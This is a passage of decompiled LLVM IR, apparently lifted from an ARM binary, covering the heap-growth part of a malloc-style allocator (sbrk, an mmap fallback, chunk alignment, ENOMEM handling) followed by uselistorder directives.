  %v0_12afc = phi i32 [ %v2_12af0, %dec_label_pc_12acc ], [ %v3_12af8, %bb155 ]
  %v1_12afc = load i32, i32* %sb.global-to-local, align 4
  %v2_12afc = add i32 %v1_12afc, %v0_12afc
  store i32 %v2_12afc, i32* %r3.global-to-local, align 4
  %v1_12b00 = sub i32 -1, %v1_12afc
  store i32 %v1_12b00, i32* %fp.global-to-local, align 4
  %v2_12b04 = and i32 %v2_12afc, %v1_12b00
  store i32 %v2_12b04, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_12b04, 1
  br i1 %tmp157, label %dec_label_pc_12b28, label %dec_label_pc_12b14

dec_label_pc_12b14:                               ; preds = %bb156
  store i32 %v2_12b04, i32* %r0.global-to-local, align 4
  %v1_12b18 = call i32 @__GI_sbrk(i32 %v2_12b04)
  store i32 %v1_12b18, i32* %r0.global-to-local, align 4
  %v3_12b1c = icmp eq i32 %v1_12b18, -1
  store i32 %v1_12b18, i32* @r4, align 4
  br i1 %v3_12b1c, label %dec_label_pc_12b28, label %dec_label_pc_12b94

dec_label_pc_12b28:                               ; preds = %dec_label_pc_12b14, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r1.global-to-local, align 4
  %v4_12b30 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v4_12b30, i32* %r6.global-to-local, align 4
  %v1_12b34 = add i32 %v4_12b30, 864
  %v2_12b34 = inttoptr i32 %v1_12b34 to i32*
  %v3_12b34 = load i32, i32* %v2_12b34, align 4
  store i32 %v3_12b34, i32* %r3.global-to-local, align 4
  %v1_12b38 = urem i32 %v3_12b34, 2
  %v2_12b38 = icmp eq i32 %v1_12b38, 0
  br i1 %v2_12b38, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_12b28
  %v1_12b3c = load i32, i32* @r8, align 4
  %v2_12b3c = load i32, i32* %sb.global-to-local, align 4
  %v3_12b3c = add i32 %v2_12b3c, %v1_12b3c
  %v2_12b40 = load i32, i32* @r5, align 4
  %v3_12b40 = add i32 %v3_12b3c, %v2_12b40
  store i32 %v3_12b40, i32* %r3.global-to-local, align 4
  %v2_12b44 = load i32, i32* %fp.global-to-local, align 4
  %v3_12b44 = and i32 %v2_12b44, %v3_12b40
  store i32 %v3_12b44, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_12b28
  %v0_12b48.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_12b48 = phi i32 [ %v0_12b48.pr, %.thread32thread-pre-split ], [ %v3_12b44, %bb158 ]
  %v2_12b48 = icmp ugt i32 %v0_12b48, 1048575
  br i1 %v2_12b48, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_12b60 = phi i32 [ %v0_12b48, %.thread32 ], [ 1048576, %bb159 ]
  %v1_12b50 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_12b60, %v1_12b50
  br i1 %tmp217, label %dec_label_pc_12b58, label %dec_label_pc_12dbc

dec_label_pc_12b58:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_12b60, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12b74 = call i32 @mmap(i32 0, i32 %v0_12b60, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12b74, i32* %r0.global-to-local, align 4
  %v3_12b78 = icmp eq i32 %v6_12b74, -1
  %v8_12b78 = icmp eq i32 %v6_12b74, -1
  store i32 %v6_12b74, i32* @r4, align 4
  br i1 %v8_12b78, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_12b58
  %v1_12b80 = load i32, i32* %r6.global-to-local, align 4
  %v2_12b80 = add i32 %v1_12b80, 864
  %v3_12b80 = inttoptr i32 %v2_12b80 to i32*
  %v4_12b80 = load i32, i32* %v3_12b80, align 4
  %v2_12b84 = load i32, i32* @r5, align 4
  %v3_12b84 = add i32 %v2_12b84, %v6_12b74
  store i32 %v3_12b84, i32* %r0.global-to-local, align 4
  %v2_12b88 = and i32 %v4_12b80, -2
  store i32 %v2_12b88, i32* %r3.global-to-local, align 4
  store i32 %v2_12b88, i32* %v3_12b80, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_12b58, %bb161
  br i1 %v3_12b78, label %dec_label_pc_12b94, label %dec_label_pc_12b98

dec_label_pc_12b94:                               ; preds = %.thread35, %dec_label_pc_12b14
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12b98

dec_label_pc_12b98:                               ; preds = %.thread35, %dec_label_pc_12b94
  %v0_12b98 = load i32, i32* @r4, align 4
  %v7_12b98 = icmp eq i32 %v0_12b98, -1
  br i1 %v7_12b98, label %dec_label_pc_12dbc, label %dec_label_pc_12ba0

dec_label_pc_12ba0:                               ; preds = %dec_label_pc_12b98
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r2.global-to-local, align 4
  %v4_12ba8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v4_12ba8, i32* %ip.global-to-local, align 4
  store i32 %v3_12ad8, i32* %r2.global-to-local, align 4
  %v1_12bb0 = add i32 %v4_12ba8, 872
  %v2_12bb0 = inttoptr i32 %v1_12bb0 to i32*
  %v3_12bb0 = load i32, i32* %v2_12bb0, align 4
  %v1_12bb4 = load i32, i32* @r8, align 4
  %v2_12bb4 = add i32 %v1_12bb4, %v3_12ad8
  store i32 %v2_12bb4, i32* %r1.global-to-local, align 4
  %v0_12bb8 = load i32, i32* @r5, align 4
  %v2_12bb8 = add i32 %v0_12bb8, %v3_12bb0
  store i32 %v2_12bb8, i32* %r3.global-to-local, align 4
  %v9_12bbc = icmp eq i32 %v0_12b98, %v2_12bb4
  br i1 %v9_12bbc, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_12ba0
  store i32 %v2_12bb8, i32* %v2_12bb0, align 4
  br label %dec_label_pc_12bd8

bb162:                                            ; preds = %dec_label_pc_12ba0
  %v1_12bc0 = load i32, i32* %r0.global-to-local, align 4
  %v8_12bc0 = icmp eq i32 %v1_12bc0, -1
  store i32 %v2_12bb8, i32* %v2_12bb0, align 4
  br i1 %v8_12bc0, label %.thread37, label %dec_label_pc_12bd8

.thread37:                                        ; preds = %bb162
  %v1_12bc8 = load i32, i32* @r5, align 4
  %v2_12bc8 = load i32, i32* @r8, align 4
  %v3_12bc8 = add i32 %v2_12bc8, %v1_12bc8
  %v2_12bcc = or i32 %v3_12bc8, 1
  store i32 %v2_12bcc, i32* %r3.global-to-local, align 4
  %v2_12bd0 = load i32, i32* %r2.global-to-local, align 4
  %v3_12bd0 = add i32 %v2_12bd0, 4
  %v4_12bd0 = inttoptr i32 %v3_12bd0 to i32*
  store i32 %v2_12bcc, i32* %v4_12bd0, align 4
  br label %dec_label_pc_12d50

dec_label_pc_12bd8:                               ; preds = %bb162, %.thread125
  %v0_12bdc.pr = load i32, i32* @r8, align 4
  %v0_12bd8 = load i32, i32* %ip.global-to-local, align 4
  %v1_12bd8 = add i32 %v0_12bd8, 864
  %v2_12bd8 = inttoptr i32 %v1_12bd8 to i32*
  %v3_12bd8 = load i32, i32* %v2_12bd8, align 4
  store i32 %v3_12bd8, i32* %r2.global-to-local, align 4
  %v2_12bdc = icmp eq i32 %v0_12bdc.pr, 0
  br i1 %v2_12bdc, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_12bd8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_12bd8
  %v2_12be4 = urem i32 %v3_12bd8, 2
  store i32 %v2_12be4, i32* %r3.global-to-local, align 4
  %v2_12be8 = icmp eq i32 %v2_12be4, 0
  br i1 %v2_12be8, label %.thread43, label %dec_label_pc_12bf0

dec_label_pc_12bf0:                               ; preds = %.thread39
  %v0_12bf0 = load i32, i32* @r4, align 4
  %v1_12bf0 = load i32, i32* %r1.global-to-local, align 4
  %v3_12bf0 = icmp ult i32 %v0_12bf0, %v1_12bf0
  br i1 %v3_12bf0, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_12bf0
  %v2_12bf4 = and i32 %v3_12bd8, -2
  store i32 %v2_12bf4, i32* %r3.global-to-local, align 4
  store i32 %v2_12bf4, i32* %v2_12bd8, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_12bf0, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %ip.global-to-local, align 4
  %v4_12c04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v4_12c04, i32* @r7, align 4
  %v1_12c08 = add i32 %v4_12c04, 864
  %v2_12c08 = inttoptr i32 %v1_12c08 to i32*
  %v3_12c08 = load i32, i32* %v2_12c08, align 4
  store i32 %v3_12c08, i32* %r3.global-to-local, align 4
  %v1_12c0c = urem i32 %v3_12c08, 2
  store i32 %v1_12c0c, i32* @r6, align 4
  %v2_12c0c = icmp eq i32 %v1_12c0c, 0
  br i1 %v2_12c0c, label %dec_label_pc_12ca0, label %dec_label_pc_12c14

dec_label_pc_12c14:                               ; preds = %.thread43
  %v0_12c14 = load i32, i32* @r8, align 4
  %v2_12c14 = icmp eq i32 %v0_12c14, 0
  br i1 %v2_12c14, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_12c14
  %v2_12c18 = add i32 %v4_12c04, 872
  %v3_12c18 = inttoptr i32 %v2_12c18 to i32*
  %v4_12c18 = load i32, i32* %v3_12c18, align 4
  store i32 %v4_12c18, i32* %r2.global-to-local, align 4
  %v1_12c1c = load i32, i32* %r1.global-to-local, align 4
  %v2_12c1c = load i32, i32* @r4, align 4
  %v3_12c1c = sub i32 %v2_12c1c, %v1_12c1c
  %v3_12c20 = add i32 %v3_12c1c, %v4_12c18
  store i32 %v3_12c20, i32* %r3.global-to-local, align 4
  store i32 %v3_12c20, i32* %v3_12c18, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_12c14, %bb164
  %v0_12c28 = load i32, i32* @r4, align 4
  %v1_12c28 = urem i32 %v0_12c28, 8
  store i32 %v1_12c28, i32* %r3.global-to-local, align 4
  %v2_12c28 = icmp eq i32 %v1_12c28, 0
  br i1 %v2_12c28, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_12c2c = sub nsw i32 8, %v1_12c28
  store i32 %v2_12c2c, i32* %r3.global-to-local, align 4
  %v3_12c30 = add i32 %v2_12c2c, %v0_12c28
  store i32 %v3_12c30, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_12c38 = phi i32 [ 0, %.thread46 ], [ %v2_12c2c, %bb165 ]
  %v1_12c34 = load i32, i32* @r5, align 4
  %v2_12c34 = add i32 %v1_12c34, %v0_12c28
  store i32 %v2_12c34, i32* @r6, align 4
  %v1_12c38 = load i32, i32* @r8, align 4
  %v2_12c38 = add i32 %v2_12c34, %v0_12c38
  %v2_12c3c = add i32 %v2_12c38, %v1_12c38
  store i32 %v2_12c3c, i32* %r1.global-to-local, align 4
  %v1_12c40 = load i32, i32* %sb.global-to-local, align 4
  %v2_12c40 = add i32 %v1_12c40, %v2_12c3c
  %v1_12c44 = load i32, i32* %fp.global-to-local, align 4
  %v2_12c44 = and i32 %v1_12c44, %v2_12c40
  store i32 %v2_12c44, i32* %r2.global-to-local, align 4
  %v2_12c48 = sub i32 0, %v2_12c34
  store i32 %v2_12c48, i32* %r3.global-to-local, align 4
  %v2_12c4c = sub i32 %v2_12c44, %v2_12c34
  store i32 %v2_12c4c, i32* @r5, align 4
  store i32 %v2_12c4c, i32* %r0.global-to-local, align 4
  br i1 %v2_12c28, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_12c28, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_12c58 = call i32 @__GI_sbrk(i32 %v2_12c4c)
  store i32 %v1_12c58, i32* %r0.global-to-local, align 4
  %v3_12c5c = icmp eq i32 %v1_12c58, -1
  br i1 %v3_12c5c, label %dec_label_pc_12c64, label %dec_label_pc_12c74

dec_label_pc_12c64:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12c68 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12c68, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12ccc

dec_label_pc_12c74:                               ; preds = %bb167
  %v1_12c74 = load i32, i32* @r4, align 4
  %v3_12c74 = icmp ult i32 %v1_12c58, %v1_12c74
  br i1 %v3_12c74, label %dec_label_pc_12c7c, label %dec_label_pc_12ccc

dec_label_pc_12c7c:                               ; preds = %dec_label_pc_12c74
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r0.global-to-local, align 4
  %v4_12c84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v4_12c84, i32* %r2.global-to-local, align 4
  %v1_12c88 = add i32 %v4_12c84, 864
  %v2_12c88 = inttoptr i32 %v1_12c88 to i32*
  %v3_12c88 = load i32, i32* %v2_12c88, align 4
  %v0_12c8c = load i32, i32* @r6, align 4
  store i32 %v0_12c8c, i32* %r0.global-to-local, align 4
  %v1_12c90 = and i32 %v3_12c88, -2
  store i32 %v1_12c90, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_12c90, i32* %v2_12c88, align 4
  br label %dec_label_pc_12ccc

dec_label_pc_12ca0:                               ; preds = %.thread43
  %v0_12ca0 = load i32, i32* %r0.global-to-local, align 4
  %v3_12ca0 = icmp eq i32 %v0_12ca0, -1
  br i1 %v3_12ca0, label %dec_label_pc_12ca8, label %dec_label_pc_12cc4

dec_label_pc_12ca8:                               ; preds = %dec_label_pc_12ca0
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12cac = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12cac, i32* %r0.global-to-local, align 4
  %v0_12cb0 = load i32, i32* @r7, align 4
  %v1_12cb0 = add i32 %v0_12cb0, 872
  %v2_12cb0 = inttoptr i32 %v1_12cb0 to i32*
  %v3_12cb0 = load i32, i32* %v2_12cb0, align 4
  store i32 %v3_12cb0, i32* %r2.global-to-local, align 4
  %v0_12cb4 = load i32, i32* @r4, align 4
  %v0_12cb8 = load i32, i32* @r5, align 4
  %v2_12cb4 = add i32 %v3_12cb0, %v1_12cac
  %v2_12cb8 = sub i32 %v2_12cb4, %v0_12cb4
  %v2_12cbc = sub i32 %v2_12cb8, %v0_12cb8
  store i32 %v2_12cbc, i32* %r3.global-to-local, align 4
  store i32 %v2_12cbc, i32* %v2_12cb0, align 4
  %v0_12cc8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12cc4

dec_label_pc_12cc4:                               ; preds = %dec_label_pc_12ca0, %dec_label_pc_12ca8
  %v0_12cc8 = phi i32 [ 0, %dec_label_pc_12ca0 ], [ %v0_12cc8.pre, %dec_label_pc_12ca8 ]
  %v0_12cc4 = load i32, i32* @r4, align 4
  store i32 %v0_12cc4, i32* @r7, align 4
  store i32 %v0_12cc8, i32* @r5, align 4
  br label %dec_label_pc_12ccc

dec_label_pc_12ccc:                               ; preds = %dec_label_pc_12c74, %dec_label_pc_12c7c, %dec_label_pc_12c64, %dec_label_pc_12cc4
  %v0_12ccc = load i32, i32* %r0.global-to-local, align 4
  %v7_12ccc = icmp eq i32 %v0_12ccc, -1
  br i1 %v7_12ccc, label %dec_label_pc_12d50, label %dec_label_pc_12cd4

dec_label_pc_12cd4:                               ; preds = %dec_label_pc_12ccc
  %v1_12cd4 = load i32, i32* @r5, align 4
  %v2_12cd4 = add i32 %v1_12cd4, %v0_12ccc
  %v0_12cd8 = load i32, i32* @r7, align 4
  %v2_12cd8 = sub i32 %v2_12cd4, %v0_12cd8
  %v1_12cdc = or i32 %v2_12cd8, 1
  %v2_12ce0 = add i32 %v0_12cd8, 4
  %v3_12ce0 = inttoptr i32 %v2_12ce0 to i32*
  store i32 %v1_12cdc, i32* %v3_12ce0, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12cec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v4_12cec, i32* @r6, align 4
  %v1_12cf0 = add i32 %v4_12cec, 872
  %v2_12cf0 = inttoptr i32 %v1_12cf0 to i32*
  %v3_12cf0 = load i32, i32* %v2_12cf0, align 4
  %v0_12cf4 = load i32, i32* @r8, align 4
  %v2_12cf4 = icmp eq i32 %v0_12cf4, 0
  %v0_12cf8 = load i32, i32* @r5, align 4
  %v2_12cf8 = add i32 %v0_12cf8, %v3_12cf0
  store i32 %v2_12cf8, i32* %r3.global-to-local, align 4
  store i32 %v2_12cf8, i32* %v2_12cf0, align 4
  %v0_12d00 = load i32, i32* @r7, align 4
  %v1_12d00 = load i32, i32* @r6, align 4
  %v2_12d00 = add i32 %v1_12d00, 44
  %v3_12d00 = inttoptr i32 %v2_12d00 to i32*
  store i32 %v0_12d00, i32* %v3_12d00, align 4
  br i1 %v2_12cf4, label %dec_label_pc_12d50, label %dec_label_pc_12d08

dec_label_pc_12d08:                               ; preds = %dec_label_pc_12cd4
  %v0_12d0c = load i32, i32* @r8, align 4
  %v1_12d0c = add i32 %v0_12d0c, -12
  %v1_12d10 = and i32 %v1_12d0c, -8
  store i32 %v3_12ad8, i32* %ip.global-to-local, align 4
  %v2_12d18 = add i32 %v1_12d10, %v3_12ad8
  store i32 %v2_12d18, i32* %r1.global-to-local, align 4
  %v2_12d1c = icmp ugt i32 %v1_12d10, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_12d24 = or i32 %v1_12d10, 1
  store i32 %v1_12d24, i32* %r3.global-to-local, align 4
  store i32 %v1_12d24, i32* %v2_12ae4, align 4
  %v0_12d2c = load i32, i32* %r2.global-to-local, align 4
  %v1_12d2c = load i32, i32* %r1.global-to-local, align 4
  %v2_12d2c = add i32 %v1_12d2c, 8
  %v3_12d2c = inttoptr i32 %v2_12d2c to i32*
  store i32 %v0_12d2c, i32* %v3_12d2c, align 4
  %v0_12d30 = load i32, i32* %r2.global-to-local, align 4
  %v1_12d30 = load i32, i32* %r1.global-to-local, align 4
  %v2_12d30 = add i32 %v1_12d30, 4
  %v3_12d30 = inttoptr i32 %v2_12d30 to i32*
  store i32 %v0_12d30, i32* %v3_12d30, align 4
  br i1 %v2_12d1c, label %dec_label_pc_12d38, label %dec_label_pc_12d50

dec_label_pc_12d38:                               ; preds = %dec_label_pc_12d08
  %v0_12d38 = load i32, i32* @r6, align 4
  %v1_12d38 = add i32 %v0_12d38, 836
  %v2_12d38 = inttoptr i32 %v1_12d38 to i32*
  %v3_12d38 = load i32, i32* %v2_12d38, align 4
  store i32 %v3_12d38, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_12d40 = load i32, i32* %ip.global-to-local, align 4
  %v1_12d40 = add i32 %v0_12d40, 8
  store i32 %v1_12d40, i32* @r0, align 4
  store i32 -1, i32* %v2_12d38, align 4
  %v0_12d48 = call i32 @free()
  store i32 %v0_12d48, i32* %r0.global-to-local, align 4
  %v0_12d4c = load i32, i32* @r4, align 4
  %v1_12d4c = load i32, i32* @r6, align 4
  %v2_12d4c = add i32 %v1_12d4c, 836
  %v3_12d4c = inttoptr i32 %v2_12d4c to i32*
  store i32 %v0_12d4c, i32* %v3_12d4c, align 4
  br label %dec_label_pc_12d50

dec_label_pc_12d50:                               ; preds = %.thread37, %dec_label_pc_12d08, %dec_label_pc_12cd4, %dec_label_pc_12ccc, %dec_label_pc_12d38
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r0.global-to-local, align 4
  %v4_12d58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v4_12d58, i32* %lr.global-to-local, align 4
  %v1_12d5c = add i32 %v4_12d58, 872
  store i32 %v1_12d5c, i32* %r1.global-to-local, align 4
  %v1_12d60 = inttoptr i32 %v1_12d5c to i32*
  %v2_12d60 = load i32, i32* %v1_12d60, align 4
  store i32 %v2_12d60, i32* %r1.global-to-local, align 4
  %v3_12d60 = add i32 %v4_12d58, 876
  %v4_12d60 = inttoptr i32 %v3_12d60 to i32*
  %v5_12d60 = load i32, i32* %v4_12d60, align 4
  store i32 %v5_12d60, i32* %r3.global-to-local, align 4
  %v1_12d68 = add i32 %v4_12d58, 868
  %v2_12d68 = inttoptr i32 %v1_12d68 to i32*
  %v3_12d68 = load i32, i32* %v2_12d68, align 4
  store i32 %v3_12d68, i32* %r3.global-to-local, align 4
  %v1_12d6c = add i32 %v4_12d58, 884
  %v2_12d6c = inttoptr i32 %v1_12d6c to i32*
  %v3_12d6c = load i32, i32* %v2_12d6c, align 4
  store i32 %v3_12d6c, i32* %r2.global-to-local, align 4
  %v2_12d70 = add i32 %v3_12d68, %v2_12d60
  store i32 %v2_12d70, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_12d60, %v5_12d60
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_12d50
  store i32 %v2_12d60, i32* %v4_12d60, align 4
  %v0_12d78.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12d78.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_12d50, %bb168
  %v1_12d78 = phi i32 [ %v3_12d6c, %dec_label_pc_12d50 ], [ %v1_12d78.pre, %bb168 ]
  %v4_12d7c = phi i32 [ %v2_12d70, %dec_label_pc_12d50 ], [ %v0_12d78.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_12d7c, %v1_12d78
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_12d7c = load i32, i32* %lr.global-to-local, align 4
  %v6_12d7c = add i32 %v5_12d7c, 884
  %v7_12d7c = inttoptr i32 %v6_12d7c to i32*
  store i32 %v4_12d7c, i32* %v7_12d7c, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_12d80 = load i32, i32* %lr.global-to-local, align 4
  %v1_12d80 = add i32 %v0_12d80, 44
  %v2_12d80 = inttoptr i32 %v1_12d80 to i32*
  %v3_12d80 = load i32, i32* %v2_12d80, align 4
  store i32 %v3_12d80, i32* %ip.global-to-local, align 4
  %v1_12d84 = add i32 %v3_12d80, 4
  %v2_12d84 = inttoptr i32 %v1_12d84 to i32*
  %v3_12d84 = load i32, i32* %v2_12d84, align 4
  store i32 %v1_12998, i32* %r1.global-to-local, align 4
  %v1_12d8c = and i32 %v3_12d84, -4
  store i32 %v1_12d8c, i32* %r3.global-to-local, align 4
  %v3_12d90 = icmp ult i32 %v1_12d8c, %v1_12998
  br i1 %v3_12d90, label %dec_label_pc_12dbc, label %dec_label_pc_12d98

dec_label_pc_12d98:                               ; preds = %bb171
  %v0_12d98 = load i32, i32* @sl, align 4
  %v2_12d98 = sub i32 %v1_12d8c, %v0_12d98
  %v2_12d9c = add i32 %v0_12d98, %v3_12d80
  store i32 %v2_12d9c, i32* %r1.global-to-local, align 4
  %v1_12da0 = or i32 %v2_12d98, 1
  store i32 %v1_12da0, i32* %r3.global-to-local, align 4
  %v1_12da4 = or i32 %v0_12d98, 1
  store i32 %v1_12da4, i32* %r2.global-to-local, align 4
  %v1_12da8 = add i32 %v3_12d80, 8
  store i32 %v1_12da8, i32* %r0.global-to-local, align 4
  store i32 %v1_12da4, i32* %v2_12d84, align 4
  %v0_12db0 = load i32, i32* %r1.global-to-local, align 4
  %v1_12db0 = load i32, i32* %lr.global-to-local, align 4
  %v2_12db0 = add i32 %v1_12db0, 44
  %v3_12db0 = inttoptr i32 %v2_12db0 to i32*
  store i32 %v0_12db0, i32* %v3_12db0, align 4
  %v0_12db4 = load i32, i32* %r3.global-to-local, align 4
  %v1_12db4 = load i32, i32* %r1.global-to-local, align 4
  %v2_12db4 = add i32 %v1_12db4, 4
  %v3_12db4 = inttoptr i32 %v2_12db4 to i32*
  store i32 %v0_12db4, i32* %v3_12db4, align 4
  br label %dec_label_pc_12dd4

dec_label_pc_12dbc:                               ; preds = %bb160, %bb171, %dec_label_pc_12b98
  store i32 62608, i32* %r3.global-to-local, align 4
  %v0_12dc0 = call i32 @__aeabi_read_tp()
  %v3_12dc4 = load i16, i16* @global_var_2225c.361, align 2
  %v4_12dc4 = sext i16 %v3_12dc4 to i32
  store i32 %v4_12dc4, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_12dcc = add i32 %v4_12dc4, %v0_12dc0
  %v4_12dcc = inttoptr i32 %v3_12dcc to i32*
  store i32 12, i32* %v4_12dcc, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12dd4

dec_label_pc_12dd4:                               ; preds = %bb154, %bb153, %dec_label_pc_12d98, %dec_label_pc_129e0, %dec_label_pc_12dbc
  %v0_12dd4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12dd4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12dd8

dec_label_pc_12dd8:                               ; preds = %.thread4, %dec_label_pc_129ac, %.thread124, %dec_label_pc_1281c, %dec_label_pc_12810, %dec_label_pc_12678, %dec_label_pc_125fc, %dec_label_pc_12dd4
  store i32 %v2_1251c, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r2.global-to-local, align 4
  %v4_12de8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 44) to i32*), align 4
  store i32 %v4_12de8, i32* @ip, align 4
  store i32 77300, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12de8)
  br label %dec_label_pc_12df4

dec_label_pc_12df4:                               ; preds = %dec_label_pc_12554, %dec_label_pc_12dd8
  %v0_12df4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12df4, i32* %r0.global-to-local, align 4
  store i32 %v3_124f0, i32* @r4, align 4
  store i32 %v6_124f0, i32* @r5, align 4
  store i32 %v9_124f0, i32* @r6, align 4
  store i32 %v12_124f0, i32* @r7, align 4
  store i32 %v15_124f0, i32* @r8, align 4
  store i32 %v18_124f0, i32* @sb, align 4
  store i32 %v21_124f0, i32* @sl, align 4
  store i32 %v24_124f0, i32* @fp, align 4
  store i32 %v27_124f0, i32* @lr, align 4
  ret i32 %v0_12df4

; uselistorder directives
  uselistorder i32 %v0_12d98, { 1, 0, 2 }
  uselistorder i32 %v3_12d80, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12d7c, { 1, 0 }
  uselistorder i32 %v2_12d60, { 2, 0, 1, 3 }
  uselistorder i32 %v4_12d58, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_12d10, { 1, 2, 0 }
  uselistorder i32 %v0_12cd8, { 1, 0 }
  uselistorder i32 %v0_12ccc, { 1, 0 }
  uselistorder i32 %v2_12cbc, { 1, 0 }
  uselistorder i32 %v2_12c4c, { 2, 1, 0 }
  uselistorder i32 %v2_12c34, { 1, 2, 0, 3 }
  uselistorder i32 %v2_12c2c, { 1, 0, 2 }
  uselistorder i32 %v1_12c28, { 2, 1, 0 }
  uselistorder i32 %v0_12c28, { 3, 1, 2, 0 }
  uselistorder i32 %v1_12c0c, { 1, 0 }
  uselistorder i32 %v2_12be4, { 1, 0 }
  uselistorder i32 %v3_12bd8, { 1, 0, 2 }
  uselistorder i32 %v2_12bb8, { 1, 0, 2 }
  uselistorder i32* %v2_12bb0, { 1, 0, 2 }
  uselistorder i32 %v0_12b98, { 1, 0 }
  uselistorder i32 %v6_12b74, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12b60, { 2, 1, 0 }
  uselistorder i32 %v0_12b48, { 1, 0 }
  uselistorder i32 %v2_12b04, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12b00, { 1, 0 }
  uselistorder i32 %v3_12ad8, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_12ab8, { 1, 0, 2 }
  uselistorder i32 %v2_12aa0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12a48, { 2, 1, 0 }
  uselistorder i32 %v6_12a3c, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_12a18, { 2, 1, 0, 3 }
  uselistorder i32 %v3_129d8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12998, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_12990, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1298c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_12978, { 1, 0 }
